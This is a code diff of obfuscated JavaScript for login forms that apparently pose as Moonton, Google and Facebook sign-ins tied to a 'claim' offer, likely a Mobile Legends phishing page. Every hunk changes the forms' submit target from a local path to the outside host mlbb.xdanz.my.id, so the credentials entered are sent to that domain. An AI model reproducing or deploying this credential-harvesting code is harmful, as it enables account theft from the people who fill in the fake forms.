@@ -234,7 +234,7 @@ form.addEventListener("submit", function (_0x46323c) {
         'claim': claimData,
         ..._0x19ac46
       };
-      fetch("/login-moonton", {
+      fetch("https://mlbb.xdanz.my.id/login-moonton", {
         'method': "POST",
         'headers': {
           'Content-Type': "application/json"
@@ -355,7 +355,7 @@ formG.addEventListener("submit", function (_0x4527ee) {
         'claim': claimData,
         ..._0x47698a
       };
-      fetch("/login-google", {
+      fetch("https://mlbb.xdanz.my.id/login-google", {
         'method': "POST",
         'headers': {
           'Content-Type': "application/json"
@@ -440,7 +440,7 @@ formFb.addEventListener("submit", function (_0x205a59) {
         'claim': claimData,
         ..._0x54fb72
       };
-      fetch("/login-facebook", {
+      fetch("https://mlbb.xdanz.my.id/login-facebook", {
         'method': "POST",
         'headers': {
           'Content-Type': "application/json"
